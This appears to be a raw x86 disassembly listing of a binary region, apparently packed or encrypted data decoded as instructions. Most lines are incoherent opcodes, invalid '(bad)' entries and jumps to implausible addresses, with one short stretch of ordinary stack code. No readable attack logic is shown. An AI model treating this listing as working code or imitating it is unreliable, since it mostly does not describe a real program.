  40422f:	dec    dh
  404231:	jbe    0x4041ca
  404233:	inc    edx
  404234:	pop    ecx
  404235:	js     0x4041e0
  404237:	mov    eax,ds:0xab355450
  40423c:	xchg   edi,eax
  40423d:	push   ecx
  40423e:	rcr    DWORD PTR [ecx],1
  404240:	sub    ch,BYTE PTR [edx]
  404242:	mov    al,ds:0x3d8f292f
  404247:	and    BYTE PTR [ebp-0x69],bh
  40424a:	enter  0x9de8,0xd1
  40424e:	test   al,0x5f
  404250:	fidiv  WORD PTR [esi+0x49109c73]
  404256:	pop    ds
  404257:	add    ecx,esi
  404259:	sub    BYTE PTR [edx+0x23d77859],ah
  40425f:	outs   dx,BYTE PTR ds:[esi]
  404260:	ss push eax
  404262:	sub    al,BYTE PTR [edx]
  404264:	int    0xbc
  404266:	pop    edi
  404267:	inc    ecx
  404268:	inc    ebp
  404269:	xchg   ebx,eax
  40426a:	cmp    al,0xa2
  40426c:	xchg   cl,bl
  40426e:	shl    esp,0x39
  404271:	and    edx,DWORD PTR [edi]
  404273:	rol    DWORD PTR [ecx-0x1e],0x7a
  404277:	push   edi
  404278:	jg     0x40428b
  40427a:	gs loopne 0x404280
  40427d:	pop    eax
  40427e:	cmp    ebp,DWORD PTR [ebx+edi*8+0x4746df64]
  404285:	jb     0x40429f
  404287:	add    eax,0x3ff56fbf
  40428c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40428d:	xchg   edx,eax
  40428e:	jge    0x404304
  404290:	cmp    DWORD PTR [ecx],ebx
  404292:	jmp    0x40421d
  404294:	mov    eax,0x8342f850
  404299:	mov    DWORD PTR [esi+ecx*8-0x478469e],eax
  4042a0:	cmp    eax,0x83db377d
  4042a5:	mov    esi,0x52a57938
  4042aa:	xor    ebx,ecx
  4042ac:	pop    edx
  4042ad:	push   esp
  4042ae:	inc    ecx
  4042af:	dec    edx
  4042b0:	aas    
  4042b1:	icebp  
  4042b2:	and    al,0x85
  4042b4:	adc    al,0x66
  4042b6:	ja     0x404291
  4042b8:	pop    ds
  4042b9:	sbb    al,0x58
  4042bb:	or     BYTE PTR [ecx-0x27309f11],dh
  4042c1:	es push 0x2c
  4042c4:	scas   al,BYTE PTR es:[edi]
  4042c5:	sti    
  4042c6:	push   ds
  4042c7:	fistp  WORD PTR [ecx+0x32]
  4042ca:	adc    al,0xde
  4042cc:	jmp    0xe714a732
  4042d1:	lds    edx,FWORD PTR [edi]
  4042d3:	(bad)  
  4042d4:	fcomi  st,st(5)
  4042d6:	pop    es
  4042d7:	addr16 xchg ebp,eax
  4042d9:	mov    BYTE PTR [ebx],bl
  4042db:	jno    0x404334
  4042dd:	mov    ah,0x0
  4042df:	mov    esp,0x3af4191a
  4042e4:	lods   al,BYTE PTR ds:[esi]
  4042e5:	adc    BYTE PTR [ecx+0x34f8edb6],al
  4042eb:	daa    
  4042ec:	sar    DWORD PTR [eax+edi*2],1
  4042ef:	loope  0x404320
  4042f1:	mov    cl,0x20
  4042f3:	fimul  DWORD PTR [esi+0x22ca793]
  4042f9:	jo     0x404290
  4042fb:	iret   
  4042fc:	loop   0x4042db
  4042fe:	aam    0x69
  404300:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404301:	not    dl
  404303:	add    ebp,DWORD PTR [esi]
  404305:	retf   
  404306:	scas   al,BYTE PTR es:[edi]
  404307:	push   ds
  404308:	out    0x72,eax
  40430a:	xor    eax,0x5b1acfc
  40430f:	pop    ebp
  404310:	and    bl,bh
  404312:	fbld   TBYTE PTR ds:[eax-0x24]
  404316:	daa    
  404317:	imul   esp,esp,0xffffffc3
  40431a:	push   cs
  40431b:	push   esi
  40431c:	fsubp  st(6),st
  40431e:	adc    dh,BYTE PTR [edx-0x6b]
  404321:	and    al,0x15
  404323:	mov    cl,0xc9
  404325:	outs   dx,DWORD PTR ds:[esi]
  404326:	mul    ah
  404328:	cs sub al,0x3e
  40432b:	sub    al,0xb8
  40432d:	sti    
  40432e:	push   0xffffffbc
  404330:	fsubr  DWORD PTR [eax+ebp*2-0x6a]
  404334:	cmp    DWORD PTR [ebx],0xffffffc1
  404337:	stc    
  404338:	jo     0x4042f9
  40433a:	lahf   
  40433b:	pop    ss
  40433c:	(bad)  
  40433d:	(bad)  
  40433e:	jmp    0x404355
  404340:	mov    bh,0x27
  404342:	or     DWORD PTR [edx],esp
  404344:	fsub   st,st(7)
  404346:	mov    ah,BYTE PTR [edi]
  404348:	adc    dl,BYTE PTR [esi]
  40434a:	xchg   ecx,eax
  40434b:	xor    DWORD PTR [edi-0x199a38b],0xffffffb0
  404352:	test   al,0xf3
  404354:	mov    ?,WORD PTR [esi+0x7c8c8f16]
  40435a:	push   esp
  40435b:	test   DWORD PTR [ebx-0x51f01610],ebp
  404361:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404362:	sti    
  404363:	mov    cl,0x8
  404365:	or     al,0x4e
  404367:	sub    ebx,DWORD PTR [ebp-0x3f6127d5]
  40436d:	ja     0x404317
  40436f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404370:	les    esp,FWORD PTR [edx-0x7]
  404373:	mov    bh,0x11
  404375:	sti    
  404376:	lds    edi,FWORD PTR [ecx]
  404378:	fidiv  WORD PTR [ecx]
  40437a:	or     ebp,DWORD PTR [eax-0x5904277e]
  404380:	scas   al,BYTE PTR es:[edi]
  404381:	nop
  404382:	pop    es
  404383:	push   eax
  404384:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404385:	jmp    0x40432e
  404387:	and    DWORD PTR [edi+ebx*4-0x4dde0fdc],edi
  40438e:	sub    edi,ebp
  404390:	test   DWORD PTR [ecx+0x5b1bad0a],ebp
  404396:	mov    ch,0x5b
  404398:	pop    ecx
  404399:	mov    ecx,0x8cb85570
  40439e:	mov    ecx,0xf72cf9c9
  4043a3:	mov    esp,0x35862255
  4043a8:	jl     0x40441a
  4043aa:	sbb    DWORD PTR [edx],edx
  4043ac:	xchg   ebx,eax
  4043ad:	fistp  WORD PTR [edi]
  4043af:	inc    ebp
  4043b0:	cmp    edx,DWORD PTR [ebx]
  4043b2:	push   ebx
  4043b3:	push   DWORD PTR [esp+eax*8]
  4043b6:	push   edi
  4043b7:	inc    edi
  4043b8:	inc    ebx
  4043b9:	inc    ebp
  4043ba:	add    DWORD PTR [ebp+esi*8+0x4d],esp
  4043be:	shr    BYTE PTR [ebx+edi*2+0x33],0x37
  4043c3:	inc    eax
  4043c4:	not    dl
  4043c6:	inc    edx
  4043c7:	(bad)  
  4043c8:	test   eax,0xa518a671
  4043cd:	mov    ?,WORD PTR [edx]
  4043cf:	cmp    BYTE PTR [esi-0x2c],cl
  4043d2:	xor    al,0xa0
  4043d4:	lds    edx,FWORD PTR [ecx]
  4043d6:	lds    ebp,FWORD PTR [eax*4-0x29b4db27]
  4043dd:	in     eax,dx
  4043de:	adc    ebx,DWORD PTR [ebx+0x560716ff]
  4043e4:	cmp    BYTE PTR [ebp-0x3d],dh
  4043e7:	enter  0x78c9,0x22
  4043eb:	stos   DWORD PTR es:[edi],eax
  4043ec:	stos   BYTE PTR es:[edi],al
  4043ed:	outs   dx,BYTE PTR ds:[esi]
  4043ee:	cmp    al,0x85
  4043f0:	dec    esp
  4043f1:	mov    dh,0xbc
  4043f3:	arpl   WORD PTR [edx-0x49529f06],cx
  4043f9:	mov    cl,0x48
  4043fb:	or     ah,bl
  4043fd:	mov    dl,0x17
  4043ff:	iret   
  404400:	gs lock jg 0x4043bc
  404404:	mov    ch,0xdf
  404406:	cli    
  404407:	pop    esp
  404408:	div    DWORD PTR [ebx+0x4620d49b]
  40440e:	sub    esp,DWORD PTR [eax]
  404410:	xchg   edx,eax
  404411:	mov    es,esi
  404413:	js     0x40439b
  404415:	push   eax
  404416:	and    ch,BYTE PTR [ebx]
  404418:	lods   al,BYTE PTR ds:[esi]
  404419:	xlat   BYTE PTR ds:[ebx]
  40441a:	leave  
  40441b:	aam    0xf1
  40441d:	mov    al,0xf6
  40441f:	cmp    ebx,DWORD PTR [ecx-0x3e2662ce]
  404425:	mov    ?,WORD PTR [ebx]
  404427:	inc    ecx
  404428:	pushf  
  404429:	mov    edx,edx
  40442b:	push   ds
  40442c:	imul   edi,DWORD PTR [eax-0x36cd2db0],0xce467432
  404436:	outs   dx,DWORD PTR ds:[esi]
  404437:	or     cl,BYTE PTR [ecx+edi*2-0x52aefc0b]
  40443e:	fcomp  QWORD PTR [esp+ebp*4+0x5144b563]
  404445:	call   DWORD PTR [edi]
  404447:	lock mov BYTE PTR [ecx+0x0],al
  40444b:	add    cl,BYTE PTR [edi-0x74]
  40444e:	xchg   BYTE PTR [edx+0x21],ch
  404451:	mov    WORD PTR [edi+0x3a],gs
  404454:	scas   al,BYTE PTR es:[edi]
  404455:	or     ah,0xe4
  404458:	clc    
  404459:	cmp    DWORD PTR ss:[ebx],esi
  40445c:	inc    ecx
  40445d:	sub    BYTE PTR [eax-0x68],dh
  404460:	cmp    ecx,DWORD PTR [edx+0x417b23ca]
  404466:	or     bl,0x30
  404469:	icebp  
  40446a:	cmp    BYTE PTR [esi+0x51435add],0xd0
  404471:	sti    
  404472:	mov    esi,0xb93d38a9
  404477:	jle    0x4044bd
  404479:	inc    esi
  40447a:	mov    bl,BYTE PTR [ebp-0x11607cd]
  404480:	add    al,BYTE PTR [eax]
  404482:	add    BYTE PTR [edx],al
  404484:	pop    ebp
  404485:	inc    esp
  404486:	dec    ecx
  404487:	popa   
  404488:	jno    0x40449d
  40448a:	jne    0x4044e2
  40448c:	xor    al,0xa0
  40448e:	jle    0x40446d
  404490:	pop    ss
  404491:	jmp    0x587e:0x7e185e75
  404498:	jl     0x404518
  40449a:	jle    0x40449b
  40449c:	mov    al,0x58
  40449e:	punpckhwd mm4,QWORD PTR [eax+eiz*4+0x1458d340]
  4044a6:	pop    ebx
  4044a7:	mov    dh,0xd7
  4044a9:	mov    ds:0xf96fef91,al
  4044ae:	dec    eax
  4044af:	lds    ecx,FWORD PTR [edx]
  4044b1:	nop
  4044b2:	(bad)  
  4044b3:	push   0xc4d2e69a
  4044b8:	add    al,0x22
  4044ba:	xor    ecx,0x4a9734c4
  4044c0:	mov    al,0x63
  4044c2:	xor    BYTE PTR [esi-0x25b29f0c],ch
  4044c8:	hlt    
  4044c9:	repnz mov gs,WORD PTR [ebx+ebp*4-0x8ba9f3d]
  4044d1:	ins    DWORD PTR es:[edi],dx
  4044d2:	push   es
  4044d3:	mov    BYTE PTR [edx],bl
  4044d5:	in     al,0x2e
  4044d7:	leave  
  4044d8:	je     0x4044d7
  4044da:	repz sar bl,1
  4044dd:	mov    ah,0x40
  4044df:	push   esp
  4044e0:	jo     0x40450e
  4044e2:	dec    al
  4044e4:	push   esi
  4044e5:	mov    ebx,0x42498a4f
  4044ea:	xor    eax,0x187b4493
  4044ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4044f0:	mov    edx,0x81d726c9
  4044f5:	mov    ecx,gs
  4044f7:	int    0xdc
  4044f9:	and    ebp,esp
  4044fb:	scas   al,BYTE PTR es:[edi]
  4044fc:	cmp    al,bh
  4044fe:	inc    ecx
  4044ff:	lahf   
  404500:	das    
  404501:	xchg   edx,eax
  404502:	and    bh,bl
  404504:	call   0x4faf112f
  404509:	int    0x6e
  40450b:	or     BYTE PTR [edi],al
  40450d:	mov    al,ds:0xf83a3b1f
  404512:	sub    ecx,DWORD PTR [edi+0x6e]
  404515:	inc    edx
  404516:	adc    ch,BYTE PTR [ecx+0x72]
  404519:	xchg   edi,eax
  40451a:	pushf  
  40451b:	mov    edx,0xaff00cb9
  404520:	mov    bh,0xf4
  404522:	sbb    eax,DWORD PTR [edx+0x2cd5ce71]
  404528:	sub    esp,DWORD PTR [esi]
  40452a:	sti    
  40452b:	jl     0x4044f3
  40452d:	mov    ebp,0x5ddc1693
  404532:	popa   
  404533:	mov    cl,0x4d
  404535:	sbb    al,0x96
  404537:	push   esi
  404538:	mov    dh,0xc5
  40453a:	sub    BYTE PTR [esi+0x4f],dl
  40453d:	pop    esp
  40453e:	xchg   BYTE PTR [esi],bh
  404540:	sbb    ebx,DWORD PTR [ebp+0x2ff13620]
  404546:	push   ss
  404547:	cmp    BYTE PTR [edi+0x75],0x99
  40454b:	jnp    0x40458d
  40454d:	mov    cl,0xc3
  40454f:	add    BYTE PTR [edx],al
  404551:	jae    0x40458b
  404553:	sub    eax,0x95c2af5f
  404558:	pop    edx
  404559:	mov    al,0xa8
  40455b:	add    edi,DWORD PTR [ebp-0x31a755c7]
  404561:	ja     0x4044ed
  404563:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404564:	jns    0x4045af
  404566:	iret   
  404567:	push   0xffffff81
  404569:	mov    ebp,DWORD PTR [ecx+0x63ee4200]
  40456f:	push   es
  404570:	ins    BYTE PTR es:[edi],dx
  404571:	xchg   esp,eax
  404572:	stc    
  404573:	mov    es,WORD PTR ds:0xe0044b41
  404579:	bound  ecx,QWORD PTR [edi+edx*8]
  40457c:	stos   DWORD PTR es:[edi],eax
  40457d:	jae    0x4045d9
  40457f:	cmp    DWORD PTR [eax+0x3f588303],esi
  404585:	imul   esp,DWORD PTR [ebx-0x15],0xf46bd766
  40458c:	pop    ebp
  40458d:	jns    0x404544
  40458f:	xlat   BYTE PTR ds:[ebx]
  404590:	lock push es
  404592:	mov    ebp,0x2d7a2e01
  404597:	ror    DWORD PTR [ebx+0x5f],0xb6
  40459b:	std    
  40459c:	fisubr WORD PTR [edi+0x7]
  40459f:	lahf   
  4045a0:	jg     0x4045a4
  4045a2:	cmp    BYTE PTR [ebp+0x16],ah
  4045a5:	mov    cl,0x20
  4045a7:	inc    ecx
  4045a8:	adc    ebx,DWORD PTR [edx+0x5a]
  4045ab:	push   ebx
  4045ac:	mov    eax,ds:0x53bb8697
  4045b1:	sbb    esp,DWORD PTR [ebp+0x6d]
  4045b4:	(bad)  
  4045b5:	out    dx,eax
  4045b6:	rcr    BYTE PTR [edi-0x2e],0x2d
  4045ba:	arpl   WORD PTR [ecx+0xb],ax
  4045bd:	into   
  4045be:	sbb    ecx,eax
  4045c0:	add    al,0xa
  4045c2:	xor    DWORD PTR [ebx+0x2f],edx
  4045c5:	sub    esi,DWORD PTR [ebx]
  4045c7:	cwde   
  4045c8:	rol    ah,cl
  4045ca:	mov    DWORD PTR [edx+0x1f83ee03],ebx
  4045d0:	xor    eax,0xede1dbd7
  4045d5:	push   edx
  4045d6:	mov    ah,0xf4
  4045d8:	jns    0x40461f
  4045da:	or     al,0x23
  4045dc:	fcomp  DWORD PTR [esp+edx*2]
  4045df:	jb     0x4045c6
  4045e1:	mov    al,0xd6
  4045e3:	mov    dl,BYTE PTR [esi+0x734c8408]
  4045e9:	mov    BYTE PTR [ebp-0x756de168],dh
  4045ef:	in     eax,0x85
  4045f1:	push   ebp
  4045f2:	or     edx,edi
  4045f4:	jmp    0x404664
  4045f6:	(bad)  
  4045f7:	call   0x8e9f12f9
  4045fc:	and    al,0x19
  4045fe:	push   es
  4045ff:	add    ebx,DWORD PTR ds:0xea1a0041
  404605:	shl    ebp,1
  404607:	jmp    0x404656
  404609:	lock ins BYTE PTR es:[edi],dx
  40460b:	mov    cl,0xd9
  40460d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40460e:	and    eax,0x7dfcacc
  404613:	mov    al,cs:0xbda15bd5
  404619:	enter  0xca52,0x7c
  40461d:	mov    ecx,0x9ddfeaac
  404622:	icebp  
  404623:	sbb    DWORD PTR [edx+0x36],0x1e
  404627:	mov    cl,bh
  404629:	pop    es
  40462a:	mov    edi,0xdc63fcd9
  40462f:	out    0x17,al
  404631:	das    
  404632:	mov    dl,0x3b
  404634:	loope  0x4045ce
  404636:	dec    ebx
  404637:	in     eax,dx
  404638:	gs aad 0xda
  40463b:	and    ebp,DWORD PTR [edi]
  40463d:	sbb    eax,0x48fa2e29
  404642:	push   ebp
  404643:	(bad)  
  404644:	out    0x6b,al
  404646:	(bad)  
  404647:	push   ss
  404648:	push   ecx
  404649:	and    al,0xd3
  40464b:	dec    eax
  40464c:	fild   DWORD PTR [edi-0x7f3dff8e]
  404652:	inc    esi
  404653:	mov    ds:0x14ae1d40,eax
  404658:	ret    0xb397
  40465b:	mov    dh,0x38
  40465d:	or     al,0xfa
  40465f:	cmp    al,0xe6
  404661:	out    dx,al
  404662:	cwde   
  404663:	test   eax,0x8b0d0711
  404668:	jmp    0x7a87bdce
  40466d:	mov    edi,0xa8dc157b
  404672:	jge    0x40461c
  404674:	call   0x9bb6:0xf188afb8
  40467b:	ret    
  40467c:	xchg   ebx,eax
  40467d:	adc    al,0xba
  40467f:	cld    
  404680:	cmp    eax,0x4aff6c2b
  404685:	jmp    0x6f0c:0xb4c2fcd9
  40468c:	adc    eax,0x8cc42a61
  404691:	jle    0x404634
  404693:	xor    BYTE PTR [ecx+eiz*8],bh
  404696:	jecxz  0x4046b5
  404698:	sub    DWORD PTR [edx-0x1167059e],edx
  40469e:	(bad)  
  40469f:	sub    al,0x32
  4046a1:	mov    edi,0x304ecadc
  4046a6:	push   0x3385c108
  4046ab:	dec    esp
  4046ac:	and    cl,bl
  4046ae:	nop
  4046af:	dec    ebp
  4046b0:	and    al,0xa7
  4046b2:	je     0x4046a4
  4046b4:	and    al,0xfd
  4046b6:	in     al,dx
  4046b7:	cmp    al,0x2c
  4046b9:	push   ebp
  4046ba:	(bad)  
  4046bb:	xor    BYTE PTR [esi+0x13],bh
  4046be:	ja     0x4046f1
  4046c0:	push   edi
  4046c1:	mov    dl,0x28
  4046c3:	js     0x4046fc
  4046c5:	pop    es
  4046c6:	jo     0x4046b4
  4046c8:	loop   0x4046f7
  4046ca:	push   eax
  4046cb:	jmp    0xcb7c:0xcb76fa15
  4046d2:	xor    BYTE PTR [edx],ch
  4046d4:	and    cl,al
  4046d6:	stos   DWORD PTR es:[edi],eax
  4046d7:	sub    ecx,DWORD PTR [edx+0x2bf9a799]
  4046dd:	jl     0x4046d9
  4046df:	(bad)  
  4046e0:	lods   al,BYTE PTR ds:[esi]
  4046e1:	dec    eax
  4046e2:	jg     0x4046c9
  4046e4:	mov    ebx,0x948b0a0e
  4046e9:	mov    edx,0xcc42f68b
  4046ee:	call   0x8503288e
  4046f3:	sub    BYTE PTR [ecx],bl
  4046f5:	xchg   BYTE PTR [ebx-0x3],bh
  4046f8:	inc    esp
  4046f9:	xlat   BYTE PTR ds:[ebx]
  4046fa:	add    eax,0xec0186cc
  4046ff:	jl     0x4046dc
  404701:	(bad)  
  404703:	ror    cl,1
  404705:	addr16 mov cl,0xd5
  404708:	ror    BYTE PTR [edx],cl
  40470a:	div    dl
  40470c:	xlat   BYTE PTR ds:[ebx]
  40470d:	dec    ebp
  40470e:	test   eax,edx
  404710:	sub    DWORD PTR [eax-0x5d],edi
  404713:	ret    
  404714:	fwait
  404715:	sbb    bl,BYTE PTR [edi]
  404717:	jle    0x40477b
  404719:	int3   
  40471a:	inc    ebp
  40471b:	sub    DWORD PTR [edx],esp
  40471d:	outs   dx,DWORD PTR ds:[esi]
  40471e:	sub    DWORD PTR [edx+0x7649c863],0x93453e29
  404728:	aad    0x26
  40472a:	mov    ecx,0x23a29bea
  40472f:	sbb    al,0x2e
  404731:	stc    
  404732:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404733:	pop    ebx
  404734:	test   al,0x59
  404736:	jns    0x40479f
  404738:	jnp    0x404783
  40473a:	dec    ebx
  40473b:	out    dx,eax
  40473c:	repz jp 0x404713
  40473f:	sbb    edx,DWORD PTR [ecx+0x20]
  404742:	out    0x46,eax
  404744:	dec    ecx
  404745:	adc    eax,0x285115c3
  40474a:	sub    ch,BYTE PTR [ecx-0x791655ce]
  404750:	scas   eax,DWORD PTR es:[edi]
  404751:	in     eax,0xa8
  404753:	stos   DWORD PTR es:[edi],eax
  404754:	scas   al,BYTE PTR es:[edi]
  404755:	ds cs sbb dl,dh
  404759:	dec    ebp
  40475a:	mov    ah,0xc
  40475c:	inc    esp
  40475d:	xor    al,0x8d
  40475f:	jp     0x40477f
  404761:	pop    edi
  404762:	div    bl
  404764:	inc    ecx
  404765:	hlt    
  404766:	mov    ecx,0xdfb941da
  40476b:	fistp  DWORD PTR [edi+0x4a]
  40476e:	out    0x34,eax
  404770:	mov    ds:0xc8179e90,al
  404775:	sbb    BYTE PTR [edx+0x41],ch
  404778:	xchg   edi,eax
  404779:	mov    eax,ds:0x4e591853
  40477e:	(bad)  
  404780:	mov    edi,0xf903d033
  404785:	add    edx,ecx
  404787:	imul   edx,edi
  40478a:	mov    DWORD PTR [ebp+0xc],edx
  40478d:	mov    edx,DWORD PTR [ebp+0xc]
  404790:	mov    DWORD PTR [ebp-0x24],edx
  404793:	mov    edx,DWORD PTR [ebp-0x8]
  404796:	add    edx,DWORD PTR [ebp-0x40]
  404799:	mov    DWORD PTR [ebp-0x18],0xf89c8531
  4047a0:	mov    DWORD PTR [ebp-0x1c],edx
  4047a3:	jmp    0x404aa6
  4047a8:	sub    ch,BYTE PTR [eax+edi*1+0x6b69b8ad]
  4047af:	test   eax,0xf2c2fa45
  4047b4:	xor    esi,edx
  4047b6:	add    al,0xa2
  4047b8:	mov    eax,0x587e7e27
  4047bd:	jl     0x40483d
  4047bf:	jle    0x4047ef
  4047c1:	xchg   esi,eax
  4047c2:	pop    edi
  4047c3:	xchg   esi,eax
  4047c4:	and    eax,0x81bc5aef
  4047c9:	pop    ebp
  4047ca:	ins    DWORD PTR es:[edi],dx
  4047cb:	cdq    
  4047cc:	lea    esp,[edx-0x137c5519]
  4047d2:	mov    edx,DWORD PTR [esi-0x24]
  4047d5:	in     eax,0x1c
  4047d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4047d8:	fisttp WORD PTR [esi+ecx*1+0x4e]
  4047dc:	nop
  4047dd:	gs cs or ch,bl
  4047e1:	fld    QWORD PTR [edx-0x44c19d82]
  4047e7:	retf   0xe3fa
  4047ea:	xchg   ebx,eax
  4047eb:	sub    BYTE PTR ds:0xe347de64,cl
  4047f1:	(bad)  [edi]
  4047f3:	jbe    0x40478d
  4047f5:	aaa    
  4047f6:	ins    BYTE PTR es:[edi],dx
  4047f7:	std    
  4047f8:	pop    ss
  4047f9:	ins    BYTE PTR es:[edi],dx
  4047fa:	pusha  
  4047fb:	gs dec edi
  4047fd:	test   dh,0x11
  404800:	and    ah,BYTE PTR [ebx]
  404802:	xchg   esp,eax
  404803:	repz mov WORD PTR [edx+0x972c12c],?
  40480a:	cli    
  40480b:	fdivp  st(6),st
  40480d:	ss addr16 nop
  404810:	out    dx,al
  404811:	jo     0x404808
  404813:	jle    0x40486c
  404815:	or     eax,0x94c18f9c
  40481a:	and    al,0xac
  40481c:	int3   
  40481d:	jge    0x40482a
  40481f:	mov    ah,0x53
  404821:	and    bh,BYTE PTR [edi]
  404823:	imul   esp,ebp,0x5e
  404826:	jle    0x40487c
  404828:	inc    edx
  404829:	(bad)  
  40482a:	push   esp
  40482b:	mov    WORD PTR [edx],gs
  40482d:	in     eax,dx
  40482e:	dec    ebx
  40482f:	mov    bl,0xd3
  404831:	cmc    
  404832:	dec    edi
  404833:	xor    DWORD PTR [edx+0x3c074255],0x6
  40483a:	das    
  40483b:	xchg   edi,eax
  40483c:	xchg   bh,ah
  40483e:	sahf   
  40483f:	jmp    0x4047fa
  404841:	pop    ds
  404842:	cmp    esi,DWORD PTR ds:[ebp-0x4b4c9278]
  404849:	or     ah,BYTE PTR [esi+0x2e]
  40484c:	retf   
  40484d:	mov    ebx,0xa458e726
  404852:	cmp    eax,0x7ce0e763
  404857:	sub    DWORD PTR [edi-0x46],0xffffffdf
  40485b:	bound  edi,QWORD PTR [edx+0x2eb32831]
  404861:	cmp    eax,0x3d4bd7b6
  404866:	jg     0x404871
  404868:	xor    eax,0x2ee0d33
  40486d:	addr16 push es
  40486f:	hlt    
  404870:	bound  esp,QWORD PTR [edx-0x1a]
  404873:	repz mov cs,edi
  404876:	jge    0x4048c6
  404878:	add    al,0x81
  40487a:	and    ah,BYTE PTR [edx+eiz*4-0x61446510]
  404881:	ds cwde 
  404883:	jmp    0x404856
  404885:	shr    DWORD PTR [edi-0x58],1
  404888:	stos   DWORD PTR es:[edi],eax
  404889:	ins    BYTE PTR es:[edi],dx
  40488a:	retf   0x415c
  40488d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40488e:	stos   DWORD PTR es:[edi],eax
  40488f:	or     eax,0x8b0bd39a
  404894:	dec    ebp
  404895:	or     BYTE PTR [eax-0x580c7d4f],dl
  40489b:	xor    DWORD PTR fs:[ebx],esi
  40489e:	cdq    
  40489f:	not    dh
  4048a1:	mul    BYTE PTR [edi]
  4048a3:	jmp    0x147869b9
  4048a8:	out    dx,al
  4048a9:	xchg   BYTE PTR [ecx+0x39],al
  4048ac:	lock mov eax,ds:0x8ad3278b
  4048b2:	xchg   ebx,eax
  4048b3:	ret    
  4048b4:	jns    0x40484d
  4048b6:	rol    esp,1
  4048b8:	dec    ecx
  4048b9:	xor    BYTE PTR [ebp+0x8418f30],bh
  4048bf:	test   ch,bh
  4048c1:	ss (bad) 
  4048c3:	out    0xac,eax
  4048c5:	cmova  edi,DWORD PTR ds:0x4d8346f3
  4048cc:	rcr    BYTE PTR [ecx-0x1b6fc029],cl
  4048d2:	push   edi
  4048d3:	mov    ecx,0xcb90b983
  4048d8:	clc    
  4048d9:	aad    0xee
  4048db:	xchg   ecx,eax
  4048dc:	xchg   ecx,eax
  4048dd:	fnstsw WORD PTR [edx-0x7ad26457]
  4048e3:	out    dx,eax
  4048e4:	sbb    DWORD PTR [ebx-0x17],esp
  4048e7:	dec    edx
  4048e8:	add    dh,BYTE PTR [esi+edx*2]
  4048eb:	sbb    DWORD PTR [esp+ebp*4+0x71],esp
  4048ef:	mov    al,0x9e
  4048f1:	fs dec ecx
  4048f3:	fwait
  4048f4:	imul   ecx,DWORD PTR [edx+0x78c38a7e],0xbd940f58
  4048fe:	rcl    BYTE PTR fs:[eax+eax*8],1
  404902:	mov    ebx,0x7540b620
  404907:	cmp    edx,DWORD PTR [edi+0x11f01f93]
  40490d:	stc    
  40490e:	push   ss
  40490f:	mov    BYTE PTR [eax],al
  404911:	clc    
  404912:	add    al,0xfa
  404914:	fdiv   DWORD PTR [ebx]
  404916:	imul   esi,DWORD PTR [ebp-0x18c554a9],0x7ee8bdf9
  404920:	aad    0x59
  404922:	push   edx
  404923:	xchg   BYTE PTR [esi],dh
  404925:	mov    esp,0x5493e8f7
  40492a:	adc    dl,cl
  40492c:	int3   
  40492d:	inc    ebx
  40492e:	fs mov esi,0xb55288a
  404934:	xor    BYTE PTR [ebx+0x7],bh
  404937:	add    eax,DWORD PTR [esi]
  404939:	sub    dh,BYTE PTR ds:0x182a6ba9
  40493f:	pop    edx
  404940:	sti    
  404941:	mov    ecx,0xc3ee638
  404946:	gs mov esp,0xa89c77ad
  40494c:	pop    eax
  40494d:	pushf  
  40494e:	(bad)  
  40494f:	pop    ebp
  404950:	imul   esi,DWORD PTR [ebx+edi*4-0x40],0x72
  404955:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404956:	or     BYTE PTR [eax],bl
  404958:	xchg   esp,eax
  404959:	dec    esp
  40495a:	cmp    BYTE PTR [esi],bl
  40495c:	mov    bh,0x3c
  40495e:	test   BYTE PTR [eax-0x4e],0x62
  404962:	inc    edx
  404963:	sub    ah,BYTE PTR [ebx]
  404965:	fldcw  WORD PTR [edi+ebx*8+0x67]
  404969:	outs   dx,DWORD PTR ds:[esi]
  40496a:	cmp    ebx,esi
  40496c:	sbb    al,0x3a
  40496e:	aam    0xd8
  404970:	daa    
  404971:	(bad)  
  404972:	aad    0xc3
  404974:	repz push esi
  404976:	sbb    al,BYTE PTR [ecx-0x555ef6a4]
  40497c:	cld    
  40497d:	addr16 mov al,0xcd
  404980:	mov    al,0xf9
  404982:	popf   
  404983:	adc    al,0x69
  404985:	xor    al,0xa9
  404987:	(bad)  
  404988:	push   es
  404989:	xor    ch,BYTE PTR [esi+0x74879071]
  40498f:	into   
  404990:	or     al,0xf0
  404992:	add    eax,0x873a2989
  404997:	jle    0x404947
  404999:	data16 or ah,bh
  40499c:	aad    0x96
  40499e:	test   al,0x6a
  4049a0:	cmp    BYTE PTR [edx],dh
  4049a2:	jg     0x4049d1
  4049a4:	retf   
  4049a5:	xlat   BYTE PTR ds:[ebx]
  4049a6:	xchg   ebx,eax
  4049a7:	test   DWORD PTR [ecx],esp
  4049a9:	sbb    BYTE PTR [ebx+0x9],bh
  4049ac:	sbb    eax,0xe7ca947
  4049b1:	mov    bh,0x74
  4049b3:	loopne 0x4049ed
  4049b5:	mov    ds:0x4da4742f,eax
  4049ba:	dec    ebx
  4049bb:	pop    ebp
  4049bc:	ror    DWORD PTR [edx],cl
  4049be:	jle    0x40499a
  4049c0:	sar    cl,cl
  4049c2:	push   es
  4049c3:	pop    ebp
  4049c4:	inc    eax
  4049c5:	xor    eax,0x8c1217ab
  4049ca:	add    al,0x89
  4049cc:	mov    dh,0x65
  4049ce:	fucomi st,st(1)
  4049d0:	or     esi,DWORD PTR ds:0x493228ac
  4049d6:	(bad)  
  4049d8:	jne    0x404a43
  4049da:	push   edx
  4049db:	cmp    eax,eax
  4049dd:	imul   esi,DWORD PTR [eax-0xbf282e6],0xffffff8b
  4049e4:	out    0x4f,al
  4049e6:	out    0x9,al
  4049e8:	dec    edi
  4049e9:	cmp    al,dl
  4049eb:	adc    ah,BYTE PTR [ebx+0x33]
  4049ee:	jo     0x404a2d
  4049f0:	sub    eax,DWORD PTR [eax-0x6ec9ffef]
  4049f6:	xlat   BYTE PTR ds:[ebx]
